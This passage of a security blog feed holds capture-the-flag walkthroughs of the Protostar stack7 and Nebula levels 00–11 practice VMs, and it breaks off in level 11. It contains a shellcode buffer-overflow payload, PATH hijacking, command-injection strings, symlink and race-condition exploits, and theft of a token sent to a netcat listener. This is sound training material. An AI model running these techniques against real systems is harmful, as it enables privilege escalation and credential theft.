&lt;pre&gt;&lt;code&gt;user@protostar:~$ python -c &amp;quot;print &#39;A&#39;*80+&#39;\x53\x85\x04\x08&#39;+&#39;\xe0\xf7\xff\xbf&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&amp;quot; &amp;gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack7 &amp;lt; /tmp/payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAS�AAAAAAAAAAAAS���������������������������������������������������������������������������������������������������������1�1۰̀Sh/ttyh/dev��1�f�&#39;�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# 
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Nebula Exploit Exercises</title>
      <link>http://mislusnys.github.io/blog/2016/05/02/nebula-exploit-exercises/</link>
      <pubDate>Mon, 02 May 2016 04:28:35 +0000</pubDate>
      
      <guid>http://mislusnys.github.io/blog/2016/05/02/nebula-exploit-exercises/</guid>
      <description>

&lt;h2 id=&#34;intro:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Intro&lt;/h2&gt;

&lt;p&gt;Ever since I stumbled upon exploit exercises website - I wanted to try the challenges. They have three main exploitable VMs: Nebula, Protostar and Fusion.
The order represents the suggested progression path.&lt;/p&gt;

&lt;p&gt;The welcome page reads:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;exploit-exercises.com provides a variety of virtual machines, documentation and challenges&lt;/em&gt;
&lt;em&gt;that can be used to learn about a variety of computer&lt;/em&gt;
&lt;em&gt;security issues such as privilege escalation, vulnerability analysis, exploit development,&lt;/em&gt;
&lt;em&gt;debugging, reverse engineering, and general cyber security issues.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here, I wrote down some of the findings while exploring the Nebula VM.&lt;/p&gt;

&lt;h2 id=&#34;about:2941ec772c52d0561257d6ef26aa317a&#34;&gt;About&lt;/h2&gt;

&lt;p&gt;Nebula takes the participant through a variety of common (and less than common) weaknesses and vulnerabilities in Linux. It takes a look at&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SUID files&lt;/li&gt;
&lt;li&gt;Permissions&lt;/li&gt;
&lt;li&gt;Race conditions&lt;/li&gt;
&lt;li&gt;Shell meta-variables&lt;/li&gt;
&lt;li&gt;$PATH weaknesses&lt;/li&gt;
&lt;li&gt;Scripting language weaknesses&lt;/li&gt;
&lt;li&gt;Binary compilation failures&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.&lt;/p&gt;

&lt;h3 id=&#34;level00:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level00&lt;/h3&gt;

&lt;h4 id=&#34;description:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the “flag00” account.
You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;To find the files:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ find / -user flag00 -perm -4000 -exec ls -l {} \; 2&amp;gt;/dev/null
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /bin/.../flag00
-rwsr-x--- 1 flag00 level00 7358 2011-11-20 21:22 /rofs/bin/.../flag00
level00@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Getting the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
level00@nebula:~$ /bin/.../flag00 
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag 
You have successfully executed getflag on a target account
flag00@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level01:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level01&lt;/h3&gt;

&lt;h4 id=&#34;description-1:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here the code uses &lt;code&gt;echo&lt;/code&gt; binary to display a string. We can exploit that by modifying &lt;code&gt;$PATH&lt;/code&gt; environment variable and placing our own version of echo in the PATH.
We can use the provided source code to get a shell by modifying the last line to execute &lt;em&gt;bash&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level01@nebula:/home/flag01$ export PATH=/tmp:$PATH
level01@nebula:/home/flag01$ cat /tmp/setuid.c 
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/bin/bash&amp;quot;);
}
level01@nebula:/home/flag01$ gcc /tmp/setuid.c -o /tmp/echo
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag 
You have successfully executed getflag on a target account
flag01@nebula:/home/flag01$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level02:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level02&lt;/h3&gt;

&lt;h4 id=&#34;description-2:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-1:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);
  
  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, we can inject additional commands into the &lt;code&gt;$USER&lt;/code&gt; environment variable and terminate the buffer with &lt;code&gt;#&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level02@nebula:/home/flag02$ export USER=&amp;quot;user &amp;amp;&amp;amp; /bin/bash #&amp;quot;
level02@nebula:/home/flag02$ ./flag02 
about to call system(&amp;quot;/bin/echo user &amp;amp;&amp;amp; /bin/bash # is cool&amp;quot;)
user
flag02@nebula:/home/flag02$ getflag 
You have successfully executed getflag on a target account
flag02@nebula:/home/flag02$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level03:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level03&lt;/h3&gt;

&lt;h4 id=&#34;description-3:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level runs crontab every few minutes which executes anything from &lt;code&gt;writable.d&lt;/code&gt; folder and then clears it.
We can reuse &lt;code&gt;/tmp/setuid.c&lt;/code&gt; file from previous levels:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03/writable.d$ cat exploit.sh
#!/bin/bash

gcc /tmp/setuid.c -o /home/flag03/shell
chmod +s /home/flag03/shell
level03@nebula:/home/flag03/writable.d$ cd ..
level03@nebula:/home/flag03$ ./shell
flag03@nebula:/home/flag03$ getflag 
You have successfully executed getflag on a target account
flag03@nebula:/home/flag03$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level04:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level04&lt;/h3&gt;

&lt;h4 id=&#34;description-4:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-2:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
      printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code tries to read the &lt;code&gt;token&lt;/code&gt; file which is read/write protected. We can bypass that by creating a symlink to the token and reading that instead.
The token file contains the password for the &lt;code&gt;flag04&lt;/code&gt; user.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level04@nebula:/home/flag04$ ln -s  /home/flag04/token /tmp/bypass
level04@nebula:/home/flag04$ ./flag04 /tmp/bypass
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level05:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level05&lt;/h3&gt;

&lt;h4 id=&#34;description-5:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level has world readable backup file which contains the private key for the &lt;code&gt;flag05&lt;/code&gt; user. We can use it to ssh in as &lt;em&gt;flag05&lt;/em&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -al
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05/.backup$ mkdir /tmp/backup
level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/backup/
level05@nebula:/home/flag05/.backup$ cd /tmp/backup/
level05@nebula:/tmp/backup$ tar xvf backup-19072011.tgz 
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/tmp/backup$ cd .ssh
level05@nebula:/tmp/backup/.ssh$ ssh -i id_rsa flag05@localhost
The authenticity of host &#39;localhost (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;localhost&#39; (ECDSA) to the list of known hosts.
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level06:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level06&lt;/h3&gt;

&lt;h4 id=&#34;description-6:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Upon closer inspection the &lt;code&gt;/etc/passwd&lt;/code&gt; file has DES hash for the flag06 user:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level06@nebula:~$ cat /etc/passwd | grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
level06@nebula:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The VM itself does not have &lt;code&gt;john&lt;/code&gt; installed, so I cracked the password in my local Kali box (the password was &lt;code&gt;hello&lt;/code&gt;) and used it to get the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level06@nebula:~$ su flag06 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level07:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level07&lt;/h3&gt;

&lt;h4 id=&#34;description-7:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-3:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-perl&#34;&gt;#!/usr/bin/perl

use CGI qw{param};

print &amp;quot;Content-type: text/html\n\n&amp;quot;;

sub ping {
  $host = $_[0];

  print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

  @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
  foreach $line (@output) { print &amp;quot;$line&amp;quot;; }

  print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);
  
}

# check if Host set. if not, display normal page, etc

ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The vulnerable script is served via thttpd:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;flag07    1169  0.0  0.1   2588   892 ?        Ss   Apr29   0:01 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And it is running on port 7007.&lt;/p&gt;

&lt;p&gt;The perl source code has a command injection vulnerability. We can inject arbitrary commands into the &lt;code&gt;Host&lt;/code&gt; parameter.
I have chosen to reuse the setuid shell from previous levels (/tmp/shell).&lt;/p&gt;

&lt;p&gt;The url encoded exploit:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.56.101:7007/index.cgi?Host=localhost|cp%20/tmp/shell%20~%20%26%26%20chmod%204755%20~/shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which executes:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cp /tmp/shell ~ &amp;amp;&amp;amp; chmod 4755 ~/shell&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;After that we can grab the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level07@nebula:/home/flag07$ ls -l
total 13
-rwxr-xr-x 1 root   root    368 2011-11-20 21:22 index.cgi
-rwsr-xr-x 1 flag07 flag07 7322 2016-04-30 06:41 shell
-rw-r--r-- 1 root   root   3719 2011-11-20 21:22 thttpd.conf
level07@nebula:/home/flag07$ ./shell
flag07@nebula:/home/flag07$ getflag 
You have successfully executed getflag on a target account
flag07@nebula:/home/flag07$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level08:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level08&lt;/h3&gt;

&lt;h4 id=&#34;description-8:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;World readable files strike again. Check what that user was up to, and use it to log into flag08 account.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This level has a world readable &lt;code&gt;capture.pcap&lt;/code&gt; file in flag08&amp;rsquo;s home folder. After SCPing it out and viewing it in wireshark,
we can extract the plaintext password:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/2016/05/01/wireshark.png&#34; alt=&#34;wireshark&#34; /&gt;&lt;/p&gt;

&lt;p&gt;The password seen in the screenshot is &lt;code&gt;backdoor...00Rm8.ate&lt;/code&gt;, hoewever, the dots here are actually &lt;code&gt;0x7F&lt;/code&gt; characters (which is Backspace),
so the correct password is &lt;code&gt;backd00Rmate&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;With this password we can get the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level08@nebula:/home/flag08$ su flag08 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level09:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level09&lt;/h3&gt;

&lt;h4 id=&#34;description-9:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;There’s a C setuid wrapper for some vulnerable PHP code…&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-4:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

function spam($email)
{
  $email = preg_replace(&amp;quot;/\./&amp;quot;, &amp;quot; dot &amp;quot;, $email);
  $email = preg_replace(&amp;quot;/@/&amp;quot;, &amp;quot; AT &amp;quot;, $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace(&amp;quot;/(\[email (.*)\])/e&amp;quot;, &amp;quot;spam(\&amp;quot;\\2\&amp;quot;)&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\[/&amp;quot;, &amp;quot;&amp;lt;&amp;quot;, $contents);
  $contents = preg_replace(&amp;quot;/\]/&amp;quot;, &amp;quot;&amp;gt;&amp;quot;, $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code has &lt;code&gt;preg_replace with /e modifier&lt;/code&gt; vulnerability.
Googling for details we find a post that details the exploitation &lt;a href=&#34;http://www.madirish.net/402&#34;&gt;here&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;The vulnerability in our case can be exploited by passing commands via second parameter (which is unused in the code itself), or,
as described in the post, via first parameter&amp;rsquo;s file contents. The file contents in our case should look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[email ${`shell commands`}]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The full exploit (again reusing setuid shell):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level09@nebula:/home/flag09$ cat /tmp/phpshell 
[email ${`cp /tmp/shell /home/flag09/shell &amp;amp;&amp;amp; chmod 4755 /home/flag09/shell`}]

level09@nebula:/home/flag09$ ./flag09 /tmp/phpshell 1
PHP Notice:  Undefined variable:  in /home/flag09/flag09.php(15) : regexp code on line 1


level09@nebula:/home/flag09$ ls -al
total 21
drwxr-x--- 1 flag09 level09   60 2016-05-01 01:20 .
drwxr-xr-x 1 root   root     120 2012-08-27 07:18 ..
-rw-r--r-- 1 flag09 flag09   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag09 flag09  3353 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag09 level09 7240 2011-11-20 21:22 flag09
-rw-r--r-- 1 root   root     491 2011-11-20 21:22 flag09.php
-rw-r--r-- 1 flag09 flag09   675 2011-05-18 02:54 .profile
-rwsr-xr-x 1 flag09 level09 7322 2016-05-01 01:20 shell
level09@nebula:/home/flag09$ ./shell
flag09@nebula:/home/flag09$ getflag 
You have successfully executed getflag on a target account
flag09@nebula:/home/flag09$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level10:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level10&lt;/h3&gt;

&lt;h4 id=&#34;description-10:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-5:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/in.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc &amp;lt; 3) {
      printf(&amp;quot;%s file host\n\tsends file to host if you have access to it\n&amp;quot;, argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf(&amp;quot;Connecting to %s:18211 .. &amp;quot;, host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&amp;amp;sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&amp;amp;sin, sizeof(struct sockaddr_in)) == -1) {
          printf(&amp;quot;Unable to connect to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }

#define HITHERE &amp;quot;.oO Oo.\n&amp;quot;
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf(&amp;quot;Unable to write banner to host %s\n&amp;quot;, host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf(&amp;quot;Connected!\nSending file .. &amp;quot;); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf(&amp;quot;Damn. Unable to open file\n&amp;quot;);
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf(&amp;quot;Unable to read from file: %s\n&amp;quot;, strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf(&amp;quot;wrote file!\n&amp;quot;);

  } else {
      printf(&amp;quot;You don&#39;t have access to %s\n&amp;quot;, file);
  }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This code is vulnerable to &amp;ldquo;time of check to time of use&amp;rdquo; race condition. It has its own wiki &lt;a href=&#34;https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use&#34;&gt;article&lt;/a&gt;.
The logic of the (SETUID) code here and the one in the article is basically the same - check if the current user has access to a file and if so - process the file.&lt;/p&gt;

&lt;p&gt;To exploit this, we need to first pass in the file that we have access to (to pass the check) and later switch it out (symlink) to another file (which we WANT to access).
The timing is crucial here and the race needs to be automated.
I wrote the following script:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/bash

rm -rf /tmp/access
touch /tmp/access
/home/flag10/flag10 /tmp/access 192.168.56.1 &amp;amp;
ln -sf /home/flag10/token /tmp/access
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After a few attempts we receive the token to our netcat listener:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# nc -lkp 18211
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
root@kali:~# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Back inside the Nebula VM:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level10@nebula:/home/flag10$ su flag10 -
Password: 
sh-4.2$ getflag 
You have successfully executed getflag on a target account
sh-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;level11:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Level11&lt;/h3&gt;

&lt;h4 id=&#34;description-11:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Description:&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.
There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;source-code-6:2941ec772c52d0561257d6ef26aa317a&#34;&gt;Source Code:&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;

/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */

int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv(&amp;quot;TEMP&amp;quot;);
  pid = getpid();
  
  asprintf(path, &amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;, tmp, pid,
      &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10),
      &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
      &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}

void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length &amp;amp; 0xff;

  for(i = 0; i &amp;lt; length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}

#define CL &amp;quot;Content-Length: &amp;quot;

int main(int argc, char **argv)
{
  char line[256];
  char buf[1024];
  char *mem;
  int length;
  int fd;
  char *path;

  if(fgets(line, sizeof(line), stdin) == NULL) {
      errx(1, &amp;quot;reading from stdin&amp;quot;);
  }

  if(strncmp(line, CL, strlen(CL)) != 0) {
      errx(1, &amp;quot;invalid header&amp;quot;);
  }

  length = atoi(line + strlen(CL));
  
  if(length &amp;lt; sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, &amp;quot;fread length&amp;quot;);
      }
      process(buf, length);
  } else {
      int blue = length;
      int pink;

      fd = getrand(&amp;amp;path);

      while(blue &amp;gt; 0) {
          printf(&amp;quot;blue = %d, length = %d, &amp;quot;, blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf(&amp;quot;pink = %d\n&amp;quot;, pink);

          if(pink &amp;lt;= 0) {
              err(1, &amp;quot;fread fail(blue = %d, length = %d)&amp;quot;, blue, length);
          }
          write(fd, buf, pink);

          blue -= pink;
      }    

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, &amp;quot;mmap&amp;quot;);
      }
      process(mem, length);
  }

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The code reads data from stdin. In order to get code execution (reach the &lt;em&gt;process&lt;/em&gt; function) we need to satisfy a few input conditions. The first line should contain a valid header, which is
&amp;ldquo;Content-Length: &amp;ldquo; followed by the length value. Then, depending on the length value, one of two execution paths are taken. If length is &amp;lt;1024 the first path is taken.
This piece of code reads into a buffer:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      if(fread(buf, length, 1, stdin) != length) {
          err(1, &amp;quot;fread length&amp;quot;);
      }
&lt;/code&gt;&lt;/pre&gt;

